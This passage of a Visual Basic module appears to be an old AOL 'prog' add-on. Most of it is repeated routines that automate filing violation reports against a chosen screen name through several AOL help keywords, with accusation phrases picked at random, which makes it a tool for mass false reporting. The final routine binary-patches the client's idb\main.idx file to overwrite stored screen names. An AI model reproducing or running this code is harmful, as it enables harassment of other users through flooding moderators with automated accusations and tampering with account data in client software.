aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
profile% = FindChildByTitle(mdi%, "Get a Member's Profile")
editz% = FindChildByClass(profile%, "_AOL_Edit")
getit% = FindChildByClass(profile%, "_AOL_Button")
Loop Until profile% <> 0
Ao_SetText editz%, Who$
Ao_Click getit%
timeout 0.001
okw% = findwindow("#32770", "America Online")
If okw% <> 0 Then
Exit Sub
End If
Do: DoEvents
Prowin% = FindChildByTitle(mdi%, "Member Profile")
If Prowin% <> 0 Then MsgBox "Highlight the violation, and then click ''OK''.", 64, ""
Loop Until Prowin% <> 0
run "&Copy"
KillWin Prowin%
Ao_Keyword ("notifyaol")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
bttn4% = GetNextWindow(bttn3%, 2)
bttn5% = GetNextWindow(bttn4%, 2)
tosbttn% = GetNextWindow(bttn5%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Screen Name:")
editzz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editzz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editzz%, Who$
Ao_Click whatz%
run "&Paste"
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
End Sub


Sub TOS_ProfileViolation_3(Who$)
Call runmenubystring("Get a Member's Profile", "Mem&bers")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
profile% = FindChildByTitle(mdi%, "Get a Member's Profile")
editz% = FindChildByClass(profile%, "_AOL_Edit")
getit% = FindChildByClass(profile%, "_AOL_Button")
Loop Until profile% <> 0
Ao_SetText editz%, Who$
Ao_Click getit%
timeout 0.001
okw% = findwindow("#32770", "America Online")
If okw% <> 0 Then
Exit Sub
End If
Do: DoEvents
Prowin% = FindChildByTitle(mdi%, "Member Profile")
If Prowin% <> 0 Then MsgBox "Highlight the violation, and then click ''OK''.", 64, ""
Loop Until Prowin% <> 0
run "&Copy"
KillWin Prowin%
Ao_Keyword ("ineedhelp")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
bttn4% = GetNextWindow(bttn3%, 2)
bttn5% = GetNextWindow(bttn4%, 2)
tosbttn% = GetNextWindow(bttn5%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Screen Name:")
editzz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editzz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editzz%, Who$
Ao_Click whatz%
run "&Paste"
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
End Sub


Sub TOS_ProfileViolation_4(Who$)
Call runmenubystring("Get a Member's Profile", "Mem&bers")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
profile% = FindChildByTitle(mdi%, "Get a Member's Profile")
editz% = FindChildByClass(profile%, "_AOL_Edit")
getit% = FindChildByClass(profile%, "_AOL_Button")
Loop Until profile% <> 0
Ao_SetText editz%, Who$
Ao_Click getit%
timeout 0.001
okw% = findwindow("#32770", "America Online")
If okw% <> 0 Then
Exit Sub
End If
Do: DoEvents
Prowin% = FindChildByTitle(mdi%, "Member Profile")
If Prowin% <> 0 Then MsgBox "Highlight the violation, and then click ''OK''.", 64, ""
Loop Until Prowin% <> 0
run "&Copy"
KillWin Prowin%
Ao_Keyword ("reachoutzone")
Do: DoEvents
reachwin% = FindChildByTitle(mdi%, "AOL Neighborhood Watch")
fuck% = FindChildByClass(reachwin%, "RICHCNTL")
fuck2% = GetNextWindow(fuck%, 2)
fuck3% = GetNextWindow(fuck2%, 2)
fuck4% = GetNextWindow(fuck3%, 2)
fuck5% = GetNextWindow(fuck4%, 2)
fuck6% = GetNextWindow(fuck5%, 2)
fuck7% = GetNextWindow(fuck6%, 2)
fuck8% = GetNextWindow(fuck7%, 2)
Loop Until reachwin% <> 0
timeout 2#
Ao_Click fuck8%
timeout 0.001
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
bttn4% = GetNextWindow(bttn3%, 2)
bttn5% = GetNextWindow(bttn4%, 2)
tosbttn% = GetNextWindow(bttn5%, 2)
Loop Until toswin% <> 0
timeout 3#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Screen Name:")
editzz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editzz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editzz%, Who$
Ao_Click whatz%
run "&Paste"
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
KillWin reachwin%
End Sub


Sub TOS_ProfileViolation_5(Who$)
Call runmenubystring("Get a Member's Profile", "Mem&bers")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
profile% = FindChildByTitle(mdi%, "Get a Member's Profile")
editz% = FindChildByClass(profile%, "_AOL_Edit")
getit% = FindChildByClass(profile%, "_AOL_Button")
Loop Until profile% <> 0
Ao_SetText editz%, Who$
Ao_Click getit%
timeout 0.001
okw% = findwindow("#32770", "America Online")
If okw% <> 0 Then
Exit Sub
End If
Do: DoEvents
Prowin% = FindChildByTitle(mdi%, "Member Profile")
If Prowin% <> 0 Then MsgBox "Highlight the violation, and then click ''OK''.", 64, ""
Loop Until Prowin% <> 0
run "&Copy"
KillWin Prowin%
Ao_Keyword ("postmaster")
Do: DoEvents
anal% = FindChildByTitle(mdi%, "Postmaster Online")
anal2% = FindChildByClass(anal%, "_AOL_Icon")
anal3% = GetNextWindow(anal2%, 2)
anal4% = GetNextWindow(anal3%, 2)
anal5% = GetNextWindow(anal4%, 2)
anal6% = GetNextWindow(anal5%, 2)
Loop Until anal% <> 0
Ao_Click anal6%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
bttn4% = GetNextWindow(bttn3%, 2)
bttn5% = GetNextWindow(bttn4%, 2)
tosbttn% = GetNextWindow(bttn5%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Screen Name:")
editzz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editzz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editzz%, Who$
Ao_Click whatz%
run "&Paste"
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
KillWin anal%
End Sub

Sub TOS_ProfileViolation_6(Who$)
Call runmenubystring("Get a Member's Profile", "Mem&bers")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
profile% = FindChildByTitle(mdi%, "Get a Member's Profile")
editz% = FindChildByClass(profile%, "_AOL_Edit")
getit% = FindChildByClass(profile%, "_AOL_Button")
Loop Until profile% <> 0
Ao_SetText editz%, Who$
Ao_Click getit%
timeout 0.001
okw% = findwindow("#32770", "America Online")
If okw% <> 0 Then
Exit Sub
End If
Do: DoEvents
Prowin% = FindChildByTitle(mdi%, "Member Profile")
If Prowin% <> 0 Then MsgBox "Highlight the violation, and then click ''OK''.", 64, ""
Loop Until Prowin% <> 0
run "&Copy"
KillWin Prowin%
Ao_Keyword ("guidepager")
Do: DoEvents
guidewin% = FindChildByTitle(mdi%, "Request a Guide")
poop% = FindChildByClass(guidewin%, "_AOL_Icon")
Loop Until guidewin% <> 0
Ao_Click poop%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
bttn4% = GetNextWindow(bttn3%, 2)
bttn5% = GetNextWindow(bttn4%, 2)
tosbttn% = GetNextWindow(bttn5%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Screen Name:")
editzz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editzz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editzz%, Who$
Ao_Click whatz%
run "&Paste"
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
KillWin guidewin%
End Sub

Sub TOS_SNViolation_1(Who$)
Ao_Keyword ("kohelp")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "I Need Help!")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
Loop Until toswin% <> 0
Ao_Click bttn3%
Do: DoEvents
toswin2% = FindChildByTitle(mdi%, "Report A Violation")
bttnz% = FindChildByClass(toswin2%, "_AOL_Icon")
blah% = GetNextWindow(bttnz%, 2)
blah2% = GetNextWindow(blah%, 2)
blah3% = GetNextWindow(blah2%, 2)
blah4% = GetNextWindow(blah3%, 2)
blah5% = GetNextWindow(blah4%, 2)
bttnz2% = GetNextWindow(blah5%, 2)
Loop Until toswin2% <> 0
Ao_Click bttnz2%
timeout 0.001
Do: DoEvents
toswin3% = FindChildByTitle(mdi%, "Screen Name & Profile Violations")
shit% = FindChildByTitle(toswin3%, "Screenname:")
namez% = GetNextWindow(shit%, 2)
shit2% = FindChildByTitle(toswin3%, "Paste Profile Violation Here:")
said% = GetNextWindow(shit2%, 2)
shit3% = GetNextWindow(said%, 2)
donez% = GetNextWindow(shit3%, 2)
Loop Until toswin3% <> 0
Randomize
    Phrases = 5
    phrase = Int(Rnd * Phrases + 1)
      If phrase = 1 Then xed$ = "I do believe this screen name is a tos violation!"
      If phrase = 2 Then xed$ = "this screenname violates aol's terms of service."
      If phrase = 3 Then xed$ = "The above screen name is an AOL TOS Violation!"
      If phrase = 4 Then xed$ = "I am reporting this screen name, because it is unappropiate, and also is a Terms of Service violation"
      If phrase = 5 Then xed$ = "Please take actions against this screenname immediately!"
Ao_SetText namez%, Who$
Ao_SetText said%, xed$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin3%
KillWin toswin2%
KillWin toswin%
End Sub


Sub TOS_SNViolation_2(Who$)
Ao_Keyword ("notifyaol")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
bttn4% = GetNextWindow(bttn3%, 2)
bttn5% = GetNextWindow(bttn4%, 2)
tosbttn% = GetNextWindow(bttn5%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Screen Name:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, Who$
Randomize
    Phrases = 5
    phrase = Int(Rnd * Phrases + 1)
      If phrase = 1 Then shit$ = "I do believe this screen name is a tos violation!"
      If phrase = 2 Then shit$ = "this screenname violates aol's terms of service."
      If phrase = 3 Then shit$ = "The above screen name is an AOL TOS Violation!"
      If phrase = 4 Then shit$ = "I am reporting this screen name, because it is unappropiate, and also is a Terms of Service violation"
      If phrase = 5 Then shit$ = "Please take actions against this screenname immediately!"
Ao_Click whatz%
Ao_SetText whatz%, shit$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
End Sub


Sub TOS_SNViolation_3(Who$)
Ao_Keyword ("ineedhelp")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
bttn4% = GetNextWindow(bttn3%, 2)
bttn5% = GetNextWindow(bttn4%, 2)
tosbttn% = GetNextWindow(bttn5%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Screen Name:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, Who$
Randomize
    Phrases = 5
    phrase = Int(Rnd * Phrases + 1)
      If phrase = 1 Then shit$ = "I do believe this screen name is a tos violation!"
      If phrase = 2 Then shit$ = "this screenname violates aol's terms of service."
      If phrase = 3 Then shit$ = "The above screen name is an AOL TOS Violation!"
      If phrase = 4 Then shit$ = "I am reporting this screen name, because it is unappropiate, and also is a Terms of Service violation"
      If phrase = 5 Then shit$ = "Please take actions against this screenname immediately!"
Ao_Click whatz%
Ao_SetText whatz%, shit$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
End Sub

Sub TOS_SNViolation_4(Who$)
Ao_Keyword ("reachoutzone")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
reachwin% = FindChildByTitle(mdi%, "AOL Neighborhood Watch")
fuck% = FindChildByClass(reachwin%, "RICHCNTL")
fuck2% = GetNextWindow(fuck%, 2)
fuck3% = GetNextWindow(fuck2%, 2)
fuck4% = GetNextWindow(fuck3%, 2)
fuck5% = GetNextWindow(fuck4%, 2)
fuck6% = GetNextWindow(fuck5%, 2)
fuck7% = GetNextWindow(fuck6%, 2)
fuck8% = GetNextWindow(fuck7%, 2)
Loop Until reachwin% <> 0
timeout 3#
Ao_Click fuck8%
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
bttn4% = GetNextWindow(bttn3%, 2)
bttn5% = GetNextWindow(bttn4%, 2)
tosbttn% = GetNextWindow(bttn5%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Screen Name:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, Who$
Randomize
    Phrases = 5
    phrase = Int(Rnd * Phrases + 1)
      If phrase = 1 Then shit$ = "I do believe this screen name is a tos violation!"
      If phrase = 2 Then shit$ = "this screenname violates aol's terms of service."
      If phrase = 3 Then shit$ = "The above screen name is an AOL TOS Violation!"
      If phrase = 4 Then shit$ = "I am reporting this screen name, because it is unappropiate, and also is a Terms of Service violation"
      If phrase = 5 Then shit$ = "Please take actions against this screenname immediately!"
Ao_Click whatz%
Ao_SetText whatz%, shit$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
KillWin reachwin%
End Sub


Sub TOS_SNViolation_5(Who$)
Ao_Keyword ("postmaster")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
anal% = FindChildByTitle(mdi%, "Postmaster Online")
anal2% = FindChildByClass(anal%, "_AOL_Icon")
anal3% = GetNextWindow(anal2%, 2)
anal4% = GetNextWindow(anal3%, 2)
anal5% = GetNextWindow(anal4%, 2)
anal6% = GetNextWindow(anal5%, 2)
Loop Until anal% <> 0
Ao_Click anal6%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
bttn4% = GetNextWindow(bttn3%, 2)
bttn5% = GetNextWindow(bttn4%, 2)
tosbttn% = GetNextWindow(bttn5%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Screen Name:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, Who$
Randomize
    Phrases = 5
    phrase = Int(Rnd * Phrases + 1)
      If phrase = 1 Then shit$ = "I do believe this screen name is a tos violation!"
      If phrase = 2 Then shit$ = "this screenname violates aol's terms of service."
      If phrase = 3 Then shit$ = "The above screen name is an AOL TOS Violation!"
      If phrase = 4 Then shit$ = "I am reporting this screen name, because it is unappropiate, and also is a Terms of Service violation"
      If phrase = 5 Then shit$ = "Please take actions against this screenname immediately!"
Ao_Click whatz%
Ao_SetText whatz%, shit$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
KillWin anal%
End Sub
Sub TOS_SNViolation_6(Who$)
Ao_Keyword ("guidepager")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
guidewin% = FindChildByTitle(mdi%, "Request a Guide")
poop% = FindChildByClass(guidewin%, "_AOL_Icon")
Loop Until guidewin% <> 0
Ao_Click poop%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
bttn4% = GetNextWindow(bttn3%, 2)
bttn5% = GetNextWindow(bttn4%, 2)
tosbttn% = GetNextWindow(bttn5%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Screen Name:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, Who$
Randomize
    Phrases = 5
    phrase = Int(Rnd * Phrases + 1)
      If phrase = 1 Then shit$ = "I do believe this screen name is a tos violation!"
      If phrase = 2 Then shit$ = "this screenname violates aol's terms of service."
      If phrase = 3 Then shit$ = "The above screen name is an AOL TOS Violation!"
      If phrase = 4 Then shit$ = "I am reporting this screen name, because it is unappropiate, and also is a Terms of Service violation"
      If phrase = 5 Then shit$ = "Please take actions against this screenname immediately!"
Ao_Click whatz%
Ao_SetText whatz%, shit$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
KillWin guidewin%
End Sub

Sub TOS_Webpage_1(where$, comments$)
Ao_Keyword ("notifyaol")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
bttn4% = GetNextWindow(bttn3%, 2)
tosbttn% = GetNextWindow(bttn4%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Web Page Address:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, where$
Ao_Click whatz%
Ao_SetText whatz%, comments$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
End Sub


Sub TOS_Webpage_2(where$, comments$)
Ao_Keyword ("ineedhelp")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
bttn4% = GetNextWindow(bttn3%, 2)
tosbttn% = GetNextWindow(bttn4%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Web Page Address:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, where$
Ao_Click whatz%
Ao_SetText whatz%, comments$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
End Sub

Sub TOS_Webpage_3(where$, comments$)
Ao_Keyword ("reachoutzone")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
reachwin% = FindChildByTitle(mdi%, "AOL Neighborhood Watch")
fuck% = FindChildByClass(reachwin%, "RICHCNTL")
fuck2% = GetNextWindow(fuck%, 2)
fuck3% = GetNextWindow(fuck2%, 2)
fuck4% = GetNextWindow(fuck3%, 2)
fuck5% = GetNextWindow(fuck4%, 2)
fuck6% = GetNextWindow(fuck5%, 2)
fuck7% = GetNextWindow(fuck6%, 2)
fuck8% = GetNextWindow(fuck7%, 2)
Loop Until reachwin% <> 0
timeout 3#
Ao_Click fuck8%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
bttn4% = GetNextWindow(bttn3%, 2)
tosbttn% = GetNextWindow(bttn4%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Web Page Address:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, where$
Ao_Click whatz%
Ao_SetText whatz%, comments$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
KillWin reachwin%
End Sub


Sub TOS_Webpage_4(where$, comments$)
Ao_Keyword ("postmaster")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
anal% = FindChildByTitle(mdi%, "Postmaster Online")
anal2% = FindChildByClass(anal%, "_AOL_Icon")
anal3% = GetNextWindow(anal2%, 2)
anal4% = GetNextWindow(anal3%, 2)
anal5% = GetNextWindow(anal4%, 2)
anal6% = GetNextWindow(anal5%, 2)
Loop Until anal% <> 0
Ao_Click anal6%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
bttn4% = GetNextWindow(bttn3%, 2)
tosbttn% = GetNextWindow(bttn4%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Web Page Address:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, where$
Ao_Click whatz%
Ao_SetText whatz%, comments$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
KillWin anal%
End Sub


Sub TOS_Webpage_5(where$, comments$)
Ao_Keyword ("guidepager")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
guidewin% = FindChildByTitle(mdi%, "Request a Guide")
poop% = FindChildByClass(guidewin%, "_AOL_Icon")
Loop Until guidewin% <> 0
Ao_Click poop%
timeout 0.001
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
bttn4% = GetNextWindow(bttn3%, 2)
tosbttn% = GetNextWindow(bttn4%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Web Page Address:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, where$
Ao_Click whatz%
Ao_SetText whatz%, comments$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
KillWin guidewin%
End Sub




Sub TOS_SNViolation_7(Who$)
Ao_Keyword ("postmaster")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
anal% = FindChildByTitle(mdi%, "Postmaster Online")
anal2% = FindChildByClass(anal%, "_AOL_Icon")
anal3% = GetNextWindow(anal2%, 2)
anal4% = GetNextWindow(anal3%, 2)
anal5% = GetNextWindow(anal4%, 2)
anal6% = GetNextWindow(anal5%, 2)
Loop Until anal% <> 0
Ao_Click anal6%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
bttn4% = GetNextWindow(bttn3%, 2)
bttn5% = GetNextWindow(bttn4%, 2)
tosbttn% = GetNextWindow(bttn5%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Screen Name:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, Who$
Randomize
    Phrases = 5
    phrase = Int(Rnd * Phrases + 1)
      If phrase = 1 Then shit$ = "I do believe this screen name is a tos violation!"
      If phrase = 2 Then shit$ = "this screenname violates aol's terms of service."
      If phrase = 3 Then shit$ = "The above screen name is an AOL TOS Violation!"
      If phrase = 4 Then shit$ = "I am reporting this screen name, because it is unappropiate, and also is a Terms of Service violation"
      If phrase = 5 Then shit$ = "Please take actions against this screenname immediately!"
Ao_Click whatz%
Ao_SetText whatz%, shit$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
KillWin anal%
End Sub


Sub AOLSNReset(SN$, aoldir$, Replace$)
l0036 = Len(SN$)
Select Case l0036
Case 3
i = SN$ + "       "
Case 4
i = SN$ + "      "
Case 5
i = SN$ + "     "
Case 6
i = SN$ + "    "
Case 7
i = SN$ + "   "
Case 8
i = SN$ + "  "
Case 9
i = SN$ + " "
Case 10
i = SN$
End Select
l0036 = Len(Replace$)
Select Case l0036
Case 3
Replace$ = Replace$ + "       "
Case 4
Replace$ = Replace$ + "      "
Case 5
Replace$ = Replace$ + "     "
Case 6
Replace$ = Replace$ + "    "
Case 7
Replace$ = Replace$ + "   "
Case 8
Replace$ = Replace$ + "  "
Case 9
Replace$ = Replace$ + " "
Case 10
Replace$ = Replace$
End Select
X = 1
Do Until 2 > 3
Text$ = ""
DoEvents
On Error Resume Next
Open aoldir$ + "\idb\main.idx" For Binary As #1
If Err Then Exit Sub
Text$ = String(32000, 0)
Get #1, X, Text$
Close #1
Open aoldir$ + "\idb\main.idx" For Binary As #2
Where1 = InStr(1, Text$, i, 1)
If Where1 Then
Mid(Text$, Where1) = Replace$
ReplaceX$ = Replace$
Put #2, X + Where1 - 1, ReplaceX$
401:
DoEvents
Where2 = InStr(1, Text$, i, 1)
If Where2 Then
Mid(Text$, Where2) = Replace$
